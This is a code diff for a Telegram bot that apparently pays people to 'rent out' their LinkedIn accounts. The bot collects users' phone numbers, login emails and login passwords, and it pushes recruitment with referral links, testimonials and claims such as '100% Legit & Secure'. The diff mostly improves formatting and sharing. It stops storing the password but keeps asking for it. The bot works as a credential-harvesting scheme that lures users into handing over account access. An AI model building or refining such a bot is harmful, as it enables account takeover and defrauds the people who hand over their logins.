@@ -3,13 +3,14 @@ import sqlite3
 from functools import wraps
 from telegram import (
     InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton,
-    ReplyKeyboardMarkup, ReplyKeyboardRemove, Update
+    ReplyKeyboardMarkup, ReplyKeyboardRemove, Update, ParseMode
 )
 from telegram.ext import (
     Updater, CommandHandler, CallbackQueryHandler, ConversationHandler,
     MessageHandler, Filters, CallbackContext
 )
 from telegram.error import BadRequest
+from datetime import datetime
 
 # ------------------------- CONFIGURATION -------------------------
 
@@ -165,17 +166,32 @@ def get_all_users():
 
 # ------------------------- HELPER FUNCTIONS -------------------------
 
+from telegram import ParseMode
+
 def safe_edit_caption(query, text, reply_markup=None):
+    """
+    Tries to edit either text or caption, always using Markdown parsing,
+    so your **bold** and *italic* will render correctly.
+    """
     try:
         if query.message.text:  # If it's a text message
-            query.edit_message_text(text=text, reply_markup=reply_markup)
+            query.edit_message_text(
+                text=text,
+                reply_markup=reply_markup,
+                parse_mode=ParseMode.MARKDOWN
+            )
         elif query.message.caption:  # If it's a media message with a caption
-            query.edit_message_caption(caption=text, reply_markup=reply_markup)
+            query.edit_message_caption(
+                caption=text,
+                reply_markup=reply_markup,
+                parse_mode=ParseMode.MARKDOWN
+            )
         else:
             # fallback or log warning
             print("⚠️ Message has neither text nor caption.")
     except Exception as e:
         print(f"❌ Failed to edit message: {e}")
+
 
 
 def go_home(update: Update, context: CallbackContext) -> int:
@@ -188,28 +204,11 @@ def get_id(update: Update, context: CallbackContext):
 
 # ------------------------- HANDLER FUNCTIONS -------------------------
 
-def main_menu(update: Update, context: CallbackContext) -> int:
-    query = update.callback_query
-    query.answer()
-    user_id = update.effective_user.id
-    status = get_application_status(user_id)
-    status_text = f"Status: {status.capitalize()}" if status else "Status: No active application"
-    text = f"Welcome back to LINKEDIN ACCOUNT RENTERS!\n\n{status_text}"
-    keyboard = [
-        [InlineKeyboardButton("Rent", callback_data="rent"),
-         InlineKeyboardButton("Help", callback_data="help")],
-        [InlineKeyboardButton("Testimonials", callback_data="testimonials"),
-         InlineKeyboardButton("Referral", callback_data="referral")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    safe_edit_caption(query, text, reply_markup)
-    return HOME
-
 def start(update: Update, context: CallbackContext) -> int:
     user = update.effective_user
     context.user_data['full_name'] = user.first_name
     status = get_application_status(user.id)
-    status_text = f"\n\nYour current application status: {status.capitalize()}" if status else "\n\nYou have no active applications."
+    status_text = f"\n\nYour current application status: \n {status.capitalize()}" if status else "\n\nYou have no active applications."
     caption = (f"Hello {user.first_name}, welcome to LINKEDIN ACCOUNT RENTERS.\n\n"
                "Your LinkedIn account == Your Personal ATM! 🏧\n\n"
                "@linkedIn_BussinessET lets you rent out your LinkedIn account for legitimate business and networking, "
@@ -232,6 +231,33 @@ def start(update: Update, context: CallbackContext) -> int:
     return HOME
 
 
+def main_menu(update: Update, context: CallbackContext) -> int:
+    query = update.callback_query
+    query.answer()
+    query.delete_message()
+    user_id = update.effective_user.id
+    status = get_application_status(user_id)
+    status_text = f"\n\nYour current application status: {status.capitalize()}" if status else "\n\nYou have no active applications."
+    caption = (f"Welcome back to LINKEDIN ACCOUNT RENTERS!\n\n"
+               "Your LinkedIn account == Your Personal ATM! 🏧\n\n"
+               "@linkedIn_BussinessET lets you rent out your LinkedIn account for legitimate business and networking, "
+               "and we pay you generously for access. It's simple, safe, and profitable!\n\n"
+               "------------------------------------" + status_text)
+    keyboard = [
+        [InlineKeyboardButton("Rent", callback_data="rent"),
+         InlineKeyboardButton("Help", callback_data="help")],
+        [InlineKeyboardButton("Testimonials", callback_data="testimonials"),
+         InlineKeyboardButton("Referral", callback_data="referral")]
+    ]
+    with open("./assets/Linked Banner.jpg", "rb") as banner:
+        photo_message = context.bot.send_photo(
+            chat_id=update.effective_chat.id,
+            photo=banner,
+            caption=caption,
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    context.user_data['menu_message_id'] = photo_message.message_id
+    return HOME
 # *************************************
 
 def admin_approve_reject(update: Update, context: CallbackContext):
@@ -243,10 +269,10 @@ def admin_approve_reject(update: Update, context: CallbackContext):
     user_id = int(user_id)
 
     if action == 'approve':
-        new_status = 'accepted'
+        new_status = 'accepted ✅'
         status_text = "✅ Approved"
     elif action == 'reject':
-        new_status = 'rejected'
+        new_status = 'rejected ❌'
         status_text = "❌ Rejected"
     else:
         return
@@ -502,6 +528,21 @@ def handle_user_message(update: Update, context: CallbackContext):
 
 
 
+def copy_link_handler(update: Update, context: CallbackContext) -> int:
+    query = update.callback_query
+    referral_link = (
+        f"https://t.me/{context.bot.username}"
+        f"?start={update.effective_user.id}"
+    )
+    # Send the referral link as a message to the user for easy copying
+    context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text=f"🔗 Here’s your referral link:\n{referral_link}\n\nYou can copy it directly from here!"
+    )
+    query.answer()  # Acknowledge the callback query
+    # return state if you're in a ConversationHandler
+    return INVITE_FRIEND
+
 # ------------------------- RENT FLOW -------------------------
 
 def rent_entry(update: Update, context: CallbackContext) -> int:
@@ -550,8 +591,12 @@ def rent_connections_response(update: Update, context: CallbackContext) -> int:
     elif connections in EARNING_MAPPING:
         weekly_earning = EARNING_MAPPING[connections]
         context.user_data['weekly_earning'] = weekly_earning
-        text = (f"Based on your {connections} connections, you could earn approximately "
-                f"${weekly_earning} per week!\nWill you like to proceed with the application?")
+        text = (
+            f"📊 *Earnings Estimation*\n\n"
+            f"👥 *Connections:* {connections}\n\n"
+            f"💸 *Estimated Weekly Earnings:* `${weekly_earning}`\n\n"
+            f"Would you like to proceed with the application?"
+        )
         keyboard = [
             [InlineKeyboardButton("Yes", callback_data="proceed_yes"),
              InlineKeyboardButton("No", callback_data="proceed_no")]
@@ -585,13 +630,13 @@ def rent_received_phone(update: Update, context: CallbackContext) -> int:
         contact = update.message.text
     context.user_data['phone'] = contact
     update.message.reply_text("Phone number received.", reply_markup=ReplyKeyboardRemove())
-    update.message.reply_text("Please enter your Email:")
+    update.message.reply_text("Please enter your Login Email:")
     return RENT_LINKEDIN
 
 def rent_received_linkedin(update: Update, context: CallbackContext) -> int:
     linkedin_account = update.message.text
     context.user_data['linkedin_account'] = linkedin_account
-    update.message.reply_text("Got it. Now, please enter your password:")
+    update.message.reply_text("Got it. Now, please enter your Login Password:")
     return RENT_PASSWORD
 
 def rent_received_password(update: Update, context: CallbackContext) -> int:
@@ -600,21 +645,29 @@ def rent_received_password(update: Update, context: CallbackContext) -> int:
 
     # Show review of all collected information.
     review_text = (
-        "Please review your application:\n\n"
-        f"Name: {context.user_data.get('full_name')}\n"
-        f"Phone: {context.user_data.get('phone')}\n"
-        f"Email: {context.user_data.get('linkedin_account')}\n"
-        f"Password: {context.user_data.get('password')}\n"
-        f"Connections: {context.user_data.get('connections')}\n"
-        f"Potential Earnings: ${context.user_data.get('weekly_earning')} per week\n\n"
-        "Is the above information correct?"
+        "📝 *Please review your application:*\n\n"
+        f"👤 *Name:* `{context.user_data.get('full_name')}`\n\n"
+        f"📞 *Phone:* `{context.user_data.get('phone')}`\n\n"
+        f"📧 *Email:* `{context.user_data.get('linkedin_account')}`\n\n"
+        f"🔐 *Password:* `{context.user_data.get('password')}`\n\n"
+        f"🤝 *Connections:* `{context.user_data.get('connections')}`\n\n"
+        f"💵 *Potential Weekly Earnings:* `${context.user_data.get('weekly_earning')}`\n\n"
+        "✅ *Is the above information correct?*"
     )
+
     keyboard = [
         [InlineKeyboardButton("Submit Application", callback_data="submit_app")],
-        [InlineKeyboardButton("Go Back", callback_data="home")]
+        [InlineKeyboardButton("🔙 Go Back", callback_data="home")]
     ]
-    update.message.reply_text(review_text, reply_markup=InlineKeyboardMarkup(keyboard))
+
+    update.message.reply_text(
+        review_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+
     return APPLICATION_REVIEW
+
 
 def submit_application(update: Update, context: CallbackContext) -> int:
     query = update.callback_query
@@ -622,24 +675,26 @@ def submit_application(update: Update, context: CallbackContext) -> int:
 
     # Collect application data
     application_data = {
-        'telegram_id': update.effective_user.id,
+        'telegram_id': str(update.effective_user.id),
         'full_name': context.user_data.get('full_name', ''),
         'phone': context.user_data.get('phone'),
         'linkedin_account': context.user_data.get('linkedin_account'),
-        'password': context.user_data.get('password'),
+        # 'password' removed for security reasons
         'connections': context.user_data.get('connections'),
-        'weekly_earning': context.user_data.get('weekly_earning')
+        'weekly_earning': context.user_data.get('weekly_earning'),
+        'submitted_at': datetime.now().isoformat()
     }
     save_application(application_data)
 
     # Prepare message with application details
-    application_message = (f"New application received:\n"
-                           f"Name: {application_data['full_name']}\n"
-                           f"Phone: {application_data['phone']}\n"
-                           f"Email: {application_data['linkedin_account']}\n"
-                           f"Password: {application_data['password']}\n"
-                           f"Connections: {application_data['connections']}\n"
-                           f"Potential Earnings: ${application_data['weekly_earning']} per week")
+    application_message = (
+        f"📥 *New Application Received:*\n\n"
+        f"👤 *Name:* {application_data['full_name']}\n\n"
+        f"📞 *Phone:* {application_data['phone']}\n\n"
+        f"🔗 *LinkedIn:* {application_data['linkedin_account']}\n\n"
+        f"🤝 *Connections:* {application_data['connections']}\n\n"
+        f"💰 *Potential Earnings:* ${application_data['weekly_earning']} / week"
+    )
 
     # Inline buttons for admin actions
     keyboard = [
@@ -655,11 +710,16 @@ def submit_application(update: Update, context: CallbackContext) -> int:
     context.bot.send_message(
         chat_id=ADMIN_CHAT_ID,
         text=application_message,
-        reply_markup=reply_markup
+        reply_markup=reply_markup,
+        parse_mode=ParseMode.MARKDOWN
     )
 
     # Notify the user that their application has been submitted
-    safe_edit_caption(query, "Your application has been submitted!\nStatus: Pending")
+    safe_edit_caption(query, "✅ Your application has been submitted!\nStatus: ⏳ Pending")
+
+    # Optional confirmation message after submission
+    query.message.reply_text("✅ Your application is successfully submitted! Thank you.")
+
     return go_home(update, context)
 
 # ------------------------- HELP FLOW -------------------------
@@ -668,20 +728,20 @@ def help_screen(update: Update, context: CallbackContext) -> int:
     query = update.callback_query
     query.answer()
     text = (
-        "Earnings based on connections:\n\n"
-        "💰100+ connections ==> $7 per week\n"
-        "💰200+ connections ==> $10 per week\n"
-        "💰300+ connections ==> $12.5 per week\n"
-        "💰400+ connections ==> $15 per week\n"
-        "💰500+ connections ==> $17.5 per week\n"
-        "💰600+ connections ==> $20 per week\n"
-        "💰700-1000+ connections ==> $25 per week\n\n"
-        "• Reliable & Secure\n"
-        "• No Scams, Guaranteed\n"
-        "• Weekly Payouts\n"
-        "• Flexible Payment Options\n\n"
-        "For any questions, you can contact our admin."
+        "💸 Weekly Earnings Based on Connections 💸\n\n"
+        "💰 100+ ➤ $7/week\n\n"
+        "💰 200+ ➤ $10/week\n\n"
+        "💰 300+ ➤ $12.5/week\n\n"
+        "💰 400+ ➤ $15/week\n\n"
+        "💰 500+ ➤ $17.5/week\n\n"
+        "💰 600+ ➤ $20/week\n\n"
+        "💰 700-1000+ ➤ $25/week\n\n"
+        "✅ 100% Legit & Secure\n\n"
+        "📅 Weekly Payouts\n\n"
+        "💳 Flexible Payment Options\n\n"
+        "💬 Questions? Contact our admin."
     )
+
     keyboard = [
         [InlineKeyboardButton("Go Back", callback_data="home"),
          InlineKeyboardButton("Contact Admin", callback_data="contact_admin")]
@@ -703,17 +763,22 @@ def testimonials(update: Update, context: CallbackContext) -> int:
     query = update.callback_query
     query.answer()
     text = (
-        "Testimonials:\n\n"
-        "“This service transformed my LinkedIn experience!” – Yoni A\n"
-        "“Fast payment and reliable service.” – User B\n"
-        "“I referred my friends and earned a bonus too!” – Henok"
+        "🌟 **What People Are Saying** 🌟\n\n"
+        "🗣️ *“This service transformed my LinkedIn experience!”*\n— **Yoni A**\n\n"
+        "🗣️ *“Fast payment and reliable service.”*\n— **Meron**\n\n"
+        "🗣️ *“I referred my friends and earned a bonus too!”*\n— **Henok**"
     )
     keyboard = [
-        [InlineKeyboardButton("Go Back", callback_data="home"),
-         InlineKeyboardButton("Testify", callback_data="testify")]
+        [
+            InlineKeyboardButton("🔙 Go Back", callback_data="home"),
+            InlineKeyboardButton("✍️ Testify", callback_data="testify")
+        ]
     ]
     safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
     return TESTIMONIALS
+
+
+
 
 def receive_testimonial(update: Update, context: CallbackContext) -> int:
     query = update.callback_query
@@ -743,10 +808,7 @@ def store_testimonial(update: Update, context: CallbackContext) -> int:
         [InlineKeyboardButton("Testimonials", callback_data="testimonials"),
          InlineKeyboardButton("Referral", callback_data="referral")]
     ]
-    update.message.reply_text(
-        "What would you like to do next?",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    return start(update, context)
     
     return HOME
 
@@ -756,25 +818,55 @@ def referral(update: Update, context: CallbackContext) -> int:
     query = update.callback_query
     query.answer()
     text = (
-        "Referral Details:\n\n"
-        "You have invited 0 users so far.\n"
-        "Invite more to earn extra bonuses!"
+        "🎁 **Referral Program** 🎁\n\n"
+        "👥 You've invited **0** friends so far.\n"
+        "🚀 Invite more to unlock **exclusive bonuses & weekly cash rewards**!\n\n"
+        "🔗 Share your referral link and start earning!"
     )
     keyboard = [
-        [InlineKeyboardButton("Go Back", callback_data="home"),
-         InlineKeyboardButton("Invite a Friend", callback_data="invite")]
+        [
+            InlineKeyboardButton("🔙 Go Back", callback_data="home"),
+            InlineKeyboardButton("📨 Invite a Friend", callback_data="invite")
+        ]
     ]
     safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
     return REFERRAL
 
 def invite_friend(update: Update, context: CallbackContext) -> int:
     query = update.callback_query
+
+    # 1) If they tapped “Copy Link,” we immediately answer with an alert:
+    if query.data == "copy_link":
+        referral_link = f"https://t.me/{context.bot.username}?start={update.effective_user.id}"
+        query.answer(
+            text=f"🔗 Referral Link:\n{referral_link}",
+            show_alert=True
+        )
+        return INVITE_FRIEND
+
+    # 2) Otherwise, show the main invite panel:
     query.answer()
     referral_link = f"https://t.me/{context.bot.username}?start={update.effective_user.id}"
-    text = f"Share this referral link with your friends:\n{referral_link}"
-    keyboard = [[InlineKeyboardButton("Go Back", callback_data="home")]]
+    text = (
+        "🎉 **Invite Friends & Earn!** 🎉\n\n"
+        "Share this link and unlock exclusive bonuses:\n\n"
+        f"```\n{referral_link}\n```"
+    )
+    keyboard = [
+        [ InlineKeyboardButton(
+            "📲 Share with Friends",
+            url=(
+                "https://t.me/share/url?"
+                "&text=Join me on start earning, Turn your LinkedIn to Money!!\n"
+                f"url={referral_link}"
+            )
+        ) ],
+        [ InlineKeyboardButton("🔗 Copy Link", callback_data="copy_link") ],
+        [ InlineKeyboardButton("🔙 Go Back", callback_data="home") ],
+    ]
     safe_edit_caption(query, text, InlineKeyboardMarkup(keyboard))
     return INVITE_FRIEND
+
 
 # ------------------------- MAIN FUNCTION -------------------------
 
@@ -869,6 +961,10 @@ def main():
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_user_reply))
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_user_message))
 
+    dp.add_handler(CallbackQueryHandler(copy_link_handler, pattern="^copy_link$"))
+    dp.add_handler(CallbackQueryHandler(invite_friend, pattern="^invite_friend$"))
+    dp.add_handler(CommandHandler("start", start))
+    
     # Modify existing /users command
     dp.add_handler(CommandHandler('users', 
         lambda u, c: list_users(u, c, page=0), 
